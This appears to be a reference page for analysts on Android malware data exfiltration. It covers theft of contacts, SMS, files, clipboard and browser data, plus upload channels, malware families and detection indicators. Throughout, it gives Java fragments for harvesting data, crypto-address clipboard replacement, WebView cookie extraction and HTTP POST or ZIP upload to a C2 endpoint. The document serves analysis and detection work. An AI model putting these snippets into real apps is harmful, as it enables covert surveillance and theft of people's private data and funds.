# Data Exfiltration

Stealing data from compromised Android devices and transmitting it to attacker-controlled infrastructure. Data exfiltration is the operational objective behind most Android malware -- permissions, persistence, and evasion exist to support it. The scope ranges from targeted credential theft (banking trojans) to bulk surveillance (state-sponsored spyware) to opportunistic harvesting (adware SDKs collecting more than they should).

See also: [C2 Communication](c2-techniques.md), [SMS Interception](sms-interception.md), [Keylogging](keylogging.md), [Screen Capture](screen-capture.md)

??? abstract "MITRE ATT&CK"

    | ID | Technique | Tactic |
    |---|---|---|
    | [T1646](https://attack.mitre.org/techniques/T1646/) | Exfiltration Over C2 Channel | Exfiltration |
    | [T1639](https://attack.mitre.org/techniques/T1639/) | Exfiltration Over Alternative Protocol | Exfiltration |
    | [T1639.001](https://attack.mitre.org/techniques/T1639/001/) | Exfiltration Over Unencrypted Non-C2 Protocol | Exfiltration |
    | [T1532](https://attack.mitre.org/techniques/T1532/) | Archive Collected Data | Collection |
    | [T1636](https://attack.mitre.org/techniques/T1636/) | Protected User Data | Collection |

    T1646 covers HTTP/HTTPS exfiltration to C2 servers. T1639 covers cloud service abuse (Telegram, Firebase, Discord) and SMS-based exfiltration. T1532 covers ZIP compression before upload. T1636 and its sub-techniques cover collection of contacts (.003), SMS (.004), call logs (.002), and calendar (.001).

??? warning "Requirements"

    | Requirement | Details |
    |-------------|---------|
    | Permissions | Varies by data type: [`READ_CONTACTS`](../permissions/contacts/read-contacts.md), [`READ_SMS`](../permissions/sms/read-sms.md), [`READ_EXTERNAL_STORAGE`](../permissions/storage/read-external-storage.md), [`READ_CALL_LOG`](../permissions/call-log/read-call-log.md), [`READ_PHONE_STATE`](../permissions/phone/read-phone-state.md), [`INTERNET`](../permissions/normal/internet.md) |
    | Exfiltration channel | HTTP/HTTPS C2, Telegram Bot API, cloud storage, SMS fallback |
    | Optional | [`MANAGE_EXTERNAL_STORAGE`](../permissions/special/manage-external-storage.md) for full filesystem access, root for cross-app data theft |

## Contact List Theft

The device contact list provides a social graph. Malware queries `ContactsContract` via `ContentResolver` to dump names, phone numbers, email addresses, and associated account metadata.

```java
Cursor cursor = getContentResolver().query(
    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
    new String[]{
        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
        ContactsContract.CommonDataKinds.Phone.NUMBER
    },
    null, null, null
);

JSONArray contacts = new JSONArray();
while (cursor.moveToNext()) {
    JSONObject c = new JSONObject();
    c.put("name", cursor.getString(0));
    c.put("phone", cursor.getString(1));
    contacts.put(c);
}
cursor.close();
exfiltrate(contacts);
```

Requires [`READ_CONTACTS`](../permissions/contacts/read-contacts.md) (runtime permission, dangerous protection level). Most malware requests this at install time alongside other permissions, buried in a batch grant flow.

### Operational Uses

| Purpose | How Contacts Are Used | Example |
|---------|----------------------|---------|
| Worm propagation | Send smishing SMS to every contact | [FluBot](../malware/families/flubot.md) sent phishing links to all contacts, creating chain-reaction infections across Europe |
| Social graph mapping | Build relationship maps for intelligence | State-sponsored tools like [Pegasus](../malware/families/pegasus.md) and [Hermit](../malware/families/hermit.md) exfiltrate contacts for network analysis |
| Targeted phishing | Spear-phish contacts using the victim's name as social proof | "Hey [contact name], [victim name] shared this with you" |
| Loan app harassment | Contact the victim's family and colleagues to pressure repayment | [SpyLoan](../malware/families/spyloan.md) apps call and message contacts with threatening or embarrassing content |

Bulk exfiltration dumps the entire contact list in one request. Incremental exfiltration tracks a `ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP` cursor to send only new or modified entries, reducing network footprint.

## SMS & Call Log Harvesting

### SMS Database

Reading the SMS content provider retroactively gives access to the entire message history, not just new messages. This differs from real-time [SMS interception](sms-interception.md) which catches messages as they arrive.

```java
Cursor cursor = getContentResolver().query(
    Uri.parse("content://sms"),
    new String[]{"address", "body", "date", "type"},
    null, null, "date DESC"
);
while (cursor.moveToNext()) {
    String sender = cursor.getString(0);
    String body = cursor.getString(1);
    long timestamp = cursor.getLong(2);
    int type = cursor.getInt(3);
    collect(sender, body, timestamp, type);
}
cursor.close();
```

The `type` field distinguishes inbox (1), sent (2), draft (3), and outbox (4). Banking trojans filter for messages containing numeric patterns matching OTP formats (4-8 digit codes) or messages from banking shortcodes. Surveillance tools exfiltrate everything.

### Call Log

```java
Cursor cursor = getContentResolver().query(
    CallLog.Calls.CONTENT_URI,
    new String[]{
        CallLog.Calls.NUMBER,
        CallLog.Calls.TYPE,
        CallLog.Calls.DATE,
        CallLog.Calls.DURATION
    },
    null, null, CallLog.Calls.DATE + " DESC"
);
```

Requires [`READ_CALL_LOG`](../permissions/call-log/read-call-log.md). Call logs reveal communication patterns, frequency of contact with specific numbers, and call durations -- valuable for surveillance and social engineering.

### Targeted Extraction

Rather than bulk-dumping everything, some families target specific message types:

| Target | Filter Pattern | Purpose |
|--------|---------------|---------|
| Banking OTPs | Sender matches bank shortcodes, body contains 4-8 digit codes | Retroactive 2FA bypass |
| Transaction confirmations | Body contains currency symbols, "transfer", "payment" | Financial monitoring |
| Authentication codes | Body contains "code", "verify", "OTP" | Account takeover |
| Two-way banking conversations | Messages to/from known bank numbers | Full transaction history reconstruction |

## File Exfiltration

### External Storage Scanning

Before Android 10, any app with [`READ_EXTERNAL_STORAGE`](../permissions/storage/read-external-storage.md) could recursively scan `/sdcard/` and read any file. Malware walks the directory tree looking for files matching target extensions or paths.

```java
private void scanDirectory(File dir) {
    File[] files = dir.listFiles();
    if (files == null) return;
    for (File file : files) {
        if (file.isDirectory()) {
            scanDirectory(file);
        } else if (isTargetFile(file.getName())) {
            exfiltrateFile(file);
        }
    }
}

private boolean isTargetFile(String name) {
    String lower = name.toLowerCase();
    return lower.endsWith(".pdf") || lower.endsWith(".doc") || lower.endsWith(".docx")
        || lower.endsWith(".xls") || lower.endsWith(".xlsx")
        || lower.endsWith(".jpg") || lower.endsWith(".png")
        || lower.endsWith(".db") || lower.endsWith(".sqlite")
        || lower.endsWith(".key") || lower.endsWith(".wallet");
}
```

### Scoped Storage Impact

Android 10 introduced scoped storage, restricting apps to their own sandbox directory and shared media collections. Direct file path access to other apps' files no longer works without [`MANAGE_EXTERNAL_STORAGE`](../permissions/special/manage-external-storage.md).

| Android Version | Storage Access | Impact on Malware |
|----------------|---------------|-------------------|
| Pre-10 | Full `/sdcard/` access with `READ_EXTERNAL_STORAGE` | Unrestricted file theft |
| 10 (API 29) | Scoped storage introduced, `requestLegacyExternalStorage=true` opt-out available | Malware targets API 28 to avoid restriction |
| 11 (API 30) | Legacy opt-out removed, `MANAGE_EXTERNAL_STORAGE` required for full access | Must request special permission via Settings intent |
| 13 (API 33) | Granular media permissions (`READ_MEDIA_IMAGES`, `READ_MEDIA_VIDEO`, `READ_MEDIA_AUDIO`) replace `READ_EXTERNAL_STORAGE` | Malware requests all three media permissions |
| 14 (API 34) | Selected media access (user can grant partial photo library) | Limits bulk media theft if user picks selectively |

Malware targeting API levels below 30 still gets legacy storage access. Many families deliberately set `targetSdkVersion` lower to avoid newer restrictions, accepting the trade-off of a Play Store compatibility warning (irrelevant for sideloaded malware).

### MediaStore API

For malware respecting scoped storage (or forced to by targeting newer APIs), the `MediaStore` API provides access to shared media collections:

```java
String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME,
    MediaStore.Images.Media.DATA};
Cursor cursor = getContentResolver().query(
    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
    projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC"
);
while (cursor.moveToNext()) {
    Uri imageUri = ContentUris.withAppendedId(
        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cursor.getLong(0));
    String name = cursor.getString(1);
    exfiltrateMedia(imageUri, name);
}
cursor.close();
```

### High-Value File Targets

| Target | Path / Identifier | Value |
|--------|------------------|-------|
| WhatsApp database | `/sdcard/WhatsApp/Databases/msgstore.db.crypt14` | Full chat history (encrypted, but key extractable with root or backup exploit) |
| WhatsApp media | `/sdcard/WhatsApp/Media/` | Photos, videos, voice notes, documents shared in chats |
| Telegram cache | `/sdcard/Android/data/org.telegram.messenger/cache/` | Cached messages and media (scoped storage blocks this post-Android 11) |
| Crypto wallet files | `.wallet`, `.dat`, `keystore` files | Private keys, seed phrases, wallet backups |
| Authentication tokens | App-specific token files in external storage | Session hijacking |
| PDF/Office documents | `.pdf`, `.doc`, `.xlsx` across `/sdcard/Documents/`, `/sdcard/Download/` | Corporate espionage, personal data |
| Photos for blackmail | Recent camera photos via `DCIM/Camera/` | [SpyLoan](../malware/families/spyloan.md) steals photos to threaten victims into paying extortionate loan fees |
| Browser downloads | `/sdcard/Download/` | Documents, credentials, downloaded files |

!!! danger "SpyLoan Pattern"

    [SpyLoan](../malware/families/spyloan.md) apps specifically target the photo gallery, contact list, and SMS history. Stolen photos (especially private or compromising images) are used as leverage to extort victims who default on predatory loans. This pattern has been documented across hundreds of Play Store apps targeting users in Southeast Asia, Latin America, and Africa.

## Clipboard Monitoring & Theft

### ClipboardManager Listener

Apps register `OnPrimaryClipChangedListener` to receive callbacks every time the user copies text. Before Android 10, any background app could read clipboard contents continuously.

```java
ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
clipboard.addPrimaryClipChangedListener(() -> {
    ClipData clip = clipboard.getPrimaryClip();
    if (clip != null && clip.getItemCount() > 0) {
        String text = clip.getItemAt(0).getText().toString();
        if (isCryptoAddress(text)) {
            replaceCryptoAddress(clipboard, text);
        }
        exfiltrate("clipboard", text);
    }
});
```

### Crypto Address Replacement (Clipboard Hijacking)

The malware monitors for cryptocurrency wallet addresses in the clipboard. When detected, it silently replaces the copied address with an attacker-controlled address. The victim pastes what they believe is the intended recipient address but sends funds to the attacker. See [Clipboard Hijacking](clipboard-hijacking.md) for full coverage.

### Android Restrictions

| Version | Change | Impact |
|---------|--------|--------|
| Android 10 (API 29) | Only the foreground app or default IME can read clipboard | Background clipboard monitoring broken |
| Android 12 (API 31) | Toast notification shown when an app reads clipboard | User sees "[App] pasted from your clipboard" |
| Android 13 (API 33) | Clipboard auto-clears after a configurable timeout | Reduces window for clipboard theft |

Post-Android 10, malware uses [accessibility services](accessibility-abuse.md) to read clipboard indirectly by intercepting paste events in text fields, or operates as an IME to maintain foreground clipboard access.

## Browser Data Theft

### Chrome and WebView Data

On rooted devices or via backup exploits, malware accesses browser databases stored in app-private directories:

| Data | Location | Contents |
|------|----------|----------|
| Cookies | `/data/data/com.android.chrome/app_chrome/Default/Cookies` | Session tokens, authentication cookies |
| Login Data | `/data/data/com.android.chrome/app_chrome/Default/Login Data` | Saved usernames and passwords (encrypted with app-specific key) |
| History | `/data/data/com.android.chrome/app_chrome/Default/History` | Browsing history with timestamps |
| Web Data | `/data/data/com.android.chrome/app_chrome/Default/Web Data` | Autofill data, saved addresses, payment methods |
| Bookmarks | `/data/data/com.android.chrome/app_chrome/Default/Bookmarks` | Bookmarked URLs |

Without root, malware targeting WebView-based apps can inject JavaScript to extract `localStorage`, `sessionStorage`, and cookies from within the WebView context if the app's WebView configuration is insecure (JavaScript enabled, no content security restrictions).

```java
webView.evaluateJavascript(
    "JSON.stringify({cookies: document.cookie, storage: JSON.stringify(localStorage)})",
    value -> exfiltrate("webview_data", value)
);
```

### Cookie Theft Implications

Stolen session cookies allow the attacker to hijack active sessions without needing credentials. Banking session tokens, social media auth cookies, and email session identifiers are high-value targets. The cookies work until the server-side session expires or the user explicitly logs out.

## Account & Credential Harvesting

### Account Enumeration

`AccountManager.getAccounts()` returns all accounts registered on the device (Google, Samsung, third-party app accounts). Requires [`GET_ACCOUNTS`](../permissions/contacts/get-accounts.md) on Android 7 and below; on Android 8+ the permission is still required but only returns accounts belonging to the same authenticator or accounts the user has explicitly granted visibility to.

```java
AccountManager am = AccountManager.get(context);
Account[] accounts = am.getAccounts();
for (Account account : accounts) {
    exfiltrate(account.type, account.name);
}
```

This reveals which services the victim uses (Google, Facebook, banking apps, crypto exchanges) and the associated email addresses or usernames. On older Android versions, this worked without any runtime permission grant.

### Cross-App Data Theft

Requires root access or exploiting backup mechanisms:

| Method | Access Required | Data Accessible |
|--------|----------------|----------------|
| Root + direct file read | Root | Any app's `/data/data/` directory: SharedPreferences, SQLite databases, internal files |
| `adb backup` exploitation | ADB access or `android:allowBackup="true"` | App data from apps that allow backup |
| Content provider exploitation | None (if provider is exported and unprotected) | Whatever the provider exposes |
| `run-as` abuse | Debug builds or ADB | App sandbox for debuggable apps |

Banking trojans and RATs with root access target:

- SharedPreferences files containing auth tokens
- SQLite databases with cached credentials
- JWT tokens stored in app internal storage
- Android Keystore entries (requires root + additional exploitation since Keystore is hardware-backed on modern devices)

## Device Information Collection

Every Android malware family collects device fingerprint data during initial C2 registration. This data serves multiple purposes: unique bot identification, anti-analysis detection, and campaign segmentation.

### Standard Fingerprint Data

```java
JSONObject info = new JSONObject();
info.put("imei", telephonyManager.getDeviceId());
info.put("imsi", telephonyManager.getSubscriberId());
info.put("phone", telephonyManager.getLine1Number());
info.put("android_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID));
info.put("model", Build.MODEL);
info.put("manufacturer", Build.MANUFACTURER);
info.put("sdk", Build.VERSION.SDK_INT);
info.put("serial", Build.SERIAL);
info.put("operator", telephonyManager.getNetworkOperatorName());
info.put("country", telephonyManager.getNetworkCountryIso());
```

### Extended Collection

| Category | Data Points | Permission Required |
|----------|------------|-------------------|
| Hardware IDs | IMEI, IMSI, MEID, serial number | [`READ_PHONE_STATE`](../permissions/phone/read-phone-state.md) |
| Network | MAC address, WiFi SSID, BSSID, IP address, carrier info | `ACCESS_WIFI_STATE`, [`ACCESS_FINE_LOCATION`](../permissions/location/access-fine-location.md) (for WiFi SSID on Android 8+) |
| SIM | SIM serial (ICCID), operator, country code, dual-SIM status | `READ_PHONE_STATE` |
| Device | Model, manufacturer, board, hardware, bootloader version | None (Build properties are public) |
| System | Android version, API level, build fingerprint, security patch level | None |
| Screen | Resolution, density, refresh rate | None |
| Storage | Total/available internal and external storage | None |
| Battery | Level, charging status, health | None |
| Installed apps | Full package list with version codes | [`QUERY_ALL_PACKAGES`](../permissions/normal/query-all-packages.md) (Android 11+) |
| Running processes | Active app list | Restricted on Android 7+ |
| Accounts | Google account emails, registered account types | [`GET_ACCOUNTS`](../permissions/contacts/get-accounts.md) |

### Anti-Analysis Use

Device info helps malware detect analysis environments:

- Emulator indicators: `Build.HARDWARE` containing "goldfish" or "ranchu", `Build.PRODUCT` containing "sdk" or "generic"
- Low IMEI entropy or default IMEI values (000000000000000)
- Missing SIM card (`TelephonyManager.getSimState() != SIM_STATE_READY`)
- Specific device models associated with analysis (Google Pixel with custom ROMs)
- Unusually small installed app lists (clean analysis device)

See [Anti-Analysis Techniques](anti-analysis-techniques.md) for comprehensive emulator and sandbox detection.

## Exfiltration Channels

### HTTP/HTTPS POST

The dominant method. Stolen data is JSON-encoded (sometimes Base64-wrapped or encrypted) and sent as a POST body to the C2 endpoint. See [C2 Communication](c2-techniques.md) for protocol details.

```java
JSONObject payload = new JSONObject();
payload.put("bot_id", botId);
payload.put("data_type", "contacts");
payload.put("payload", Base64.encodeToString(contactsJson.getBytes(), Base64.NO_WRAP));

URL url = new URL(c2Url + "/upload");
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setRequestMethod("POST");
conn.setDoOutput(true);
conn.getOutputStream().write(payload.toString().getBytes());
```

### Cloud Service Abuse

Legitimate cloud services used as exfiltration endpoints, making traffic harder to distinguish from normal usage:

| Service | Method | Observed In |
|---------|--------|------------|
| Telegram Bot API | `sendDocument` / `sendMessage` to attacker's chat | [Mamont](../malware/families/mamont.md), [Anubis](../malware/families/anubis.md), [FireScam](../malware/families/firescam.md) |
| Firebase Realtime Database | Direct writes to attacker-controlled Firebase project | [FireScam](../malware/families/firescam.md), [TrickMo](../malware/families/trickmo.md) |
| Discord webhooks | POST to webhook URL with file attachments | Commodity RATs, open-source Android RATs |
| Yandex Disk API | File upload via REST API | Russian-origin families |
| Google Drive | OAuth-based upload using stolen or embedded credentials | State-sponsored tools |
| AWS S3 | Direct PUT to pre-signed URLs | Sophisticated campaigns |

### SMS-Based Exfiltration

Low-bandwidth fallback when internet connectivity is unavailable. The malware sends stolen data (OTP codes, short text) via SMS to an attacker-controlled number. Limited by SMS message length (160 characters) and per-message cost. Used primarily by [Rafel RAT](../malware/families/rafelrat.md) and older banking trojans as a secondary channel.

### Compressed Archive Upload

For bulk data theft (photos, documents, database files), malware creates ZIP archives and uploads them on a schedule or when connected to WiFi to avoid mobile data charges:

```java
ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(archivePath));
for (File file : targetFiles) {
    zos.putNextEntry(new ZipEntry(file.getName()));
    FileInputStream fis = new FileInputStream(file);
    byte[] buffer = new byte[4096];
    int len;
    while ((len = fis.read(buffer)) > 0) {
        zos.write(buffer, 0, len);
    }
    fis.close();
    zos.closeEntry();
}
zos.close();
uploadToC2(archivePath);
```

Spyware families like [Pegasus](../malware/families/pegasus.md) and [FinSpy](../malware/families/finspy.md) use chunked uploads with resume capability for large files, transmitting only over WiFi by default to avoid alerting the victim with unexpected data usage.

## Families by Exfiltrated Data Type

| Family | Contacts | SMS | Call Log | Files | Photos | Clipboard | Browser | Device Info | Location |
|--------|----------|-----|----------|-------|--------|-----------|---------|-------------|----------|
| [Pegasus](../malware/families/pegasus.md) | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes |
| [FinSpy](../malware/families/finspy.md) | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes |
| [Hermit](../malware/families/hermit.md) | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes |
| [SpyNote](../malware/families/spynote.md) | Yes | Yes | Yes | Yes | Yes | Yes | No | Yes | Yes |
| [FluBot](../malware/families/flubot.md) | Yes | Yes | No | No | No | No | No | Yes | No |
| [SpyLoan](../malware/families/spyloan.md) | Yes | Yes | Yes | No | Yes | No | No | Yes | Yes |
| [Cerberus](../malware/families/cerberus.md) | Yes | Yes | No | No | No | No | No | Yes | Yes |
| [Anubis](../malware/families/anubis.md) | Yes | Yes | No | Yes | No | No | No | Yes | Yes |
| [LightSpy](../malware/families/lightspy.md) | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes |
| [Predator](../malware/families/predator.md) | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes |
| [GodFather](../malware/families/godfather.md) | No | Yes | No | No | No | No | No | Yes | No |
| [MoqHao](../malware/families/moqhao.md) | Yes | Yes | No | No | No | No | No | Yes | No |
| [Mamont](../malware/families/mamont.md) | No | Yes | No | Yes | Yes | No | No | Yes | No |
| [TrickMo](../malware/families/trickmo.md) | No | Yes | No | No | Yes | No | No | Yes | Yes |
| [FireScam](../malware/families/firescam.md) | Yes | Yes | Yes | No | No | Yes | No | Yes | No |
| [Rafel RAT](../malware/families/rafelrat.md) | Yes | Yes | Yes | Yes | No | No | No | Yes | Yes |
| [EagleMsgSpy](../malware/families/eaglemsgspy.md) | Yes | Yes | Yes | Yes | Yes | No | No | Yes | Yes |
| [PJobRAT](../malware/families/pjobrat.md) | Yes | Yes | Yes | Yes | No | No | No | Yes | Yes |
| [KoSpy](../malware/families/kospy.md) | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes |
| [PlainGnome](../malware/families/plaingnome.md) | Yes | Yes | Yes | Yes | Yes | No | No | Yes | Yes |

State-sponsored spyware ([Pegasus](../malware/families/pegasus.md), [Predator](../malware/families/predator.md), [Hermit](../malware/families/hermit.md), [FinSpy](../malware/families/finspy.md)) exfiltrates everything. Banking trojans focus on SMS/OTPs and device info. Loan apps ([SpyLoan](../malware/families/spyloan.md)) target contacts and photos for extortion.

## Platform Lifecycle

| Android Version | API | Change | Offensive Impact |
|----------------|-----|--------|-----------------|
| 6.0 | 23 | [Runtime permissions](https://developer.android.com/training/permissions/requesting) | Contacts, SMS, call log, storage require user grant; [accessibility](accessibility-abuse.md) auto-grants |
| 7.0 | 24 | `GET_ACCOUNTS` restricted | Third-party account enumeration limited |
| 8.0 | 26 | [Background execution limits](https://developer.android.com/about/versions/oreo/background) | Background services killed, affects continuous monitoring |
| 10 | 29 | [Scoped storage](https://developer.android.com/about/versions/10/privacy/changes#scoped-storage), clipboard restrictions | File access limited to own sandbox; clipboard reading restricted to foreground app |
| 10 | 29 | [Non-resettable identifiers restricted](https://developer.android.com/about/versions/10/privacy/changes#non-resettable-device-ids) | IMEI, serial number inaccessible without `READ_PRIVILEGED_PHONE_STATE` |
| 11 | 30 | [`MANAGE_EXTERNAL_STORAGE`](https://developer.android.com/training/data-storage/manage-all-files) for all-files access, [package visibility filtering](https://developer.android.com/training/package-visibility) | Full storage access requires special permission; installed app list requires `QUERY_ALL_PACKAGES` |
| 12 | 31 | [Approximate location option](https://developer.android.com/about/versions/12/behavior-changes-12#approximate-location), clipboard toast | Users can grant coarse location only; clipboard reads visible to user |
| 13 | 33 | [Granular media permissions](https://developer.android.com/about/versions/13/behavior-changes-13#granular-media-permissions), [photo picker](https://developer.android.com/training/data-storage/shared/photopicker) | `READ_MEDIA_IMAGES`/`VIDEO`/`AUDIO` replace storage permission; photo picker limits bulk theft |
| 14 | 34 | [Selected photos access](https://developer.android.com/about/versions/14/changes/partial-photo-video-access) | Users can grant access to specific photos only |
| 15 | 35 | Screen recording detection, enhanced privacy sandbox | Apps can detect when they are being recorded |

## Detection During Analysis

??? example "Static Indicators"

    - `ContentResolver.query()` calls against `ContactsContract`, `content://sms`, `CallLog.Calls`, `MediaStore`
    - `READ_CONTACTS`, `READ_SMS`, `READ_CALL_LOG`, `READ_EXTERNAL_STORAGE` in manifest
    - `MANAGE_EXTERNAL_STORAGE` in manifest (unusual for most legitimate apps)
    - `AccountManager.getAccounts()` usage
    - `ClipboardManager` with `OnPrimaryClipChangedListener`
    - File scanning methods targeting specific extensions (`.pdf`, `.doc`, `.wallet`, `.db`)
    - `TelephonyManager` calls for IMEI, IMSI, phone number
    - `Build.MODEL`, `Build.SERIAL`, `Build.MANUFACTURER` in device info collection blocks
    - Base64 encoding applied to collected data before network transmission
    - ZIP archive creation followed by HTTP upload
    - References to `content://com.whatsapp.provider` or WhatsApp database paths
    - `MediaStore.Images` or `MediaStore.Video` queries with bulk iteration

??? example "Dynamic Indicators"

    - Bulk `ContentResolver` queries immediately after permission grant
    - Large outbound POST requests containing Base64-encoded data
    - File system traversal of `/sdcard/` directories
    - Network traffic containing device identifiers (IMEI patterns, Android ID)
    - ZIP file creation in app cache directory followed by upload
    - Clipboard listener registrations visible via `dumpsys clipboard`
    - Periodic data uploads on fixed intervals (every 5, 15, 30 minutes)
    - WiFi-only upload behavior (exfiltration pauses on mobile data)
    - Outbound requests to `api.telegram.org` containing document uploads
    - Firebase Realtime Database writes with structured victim data
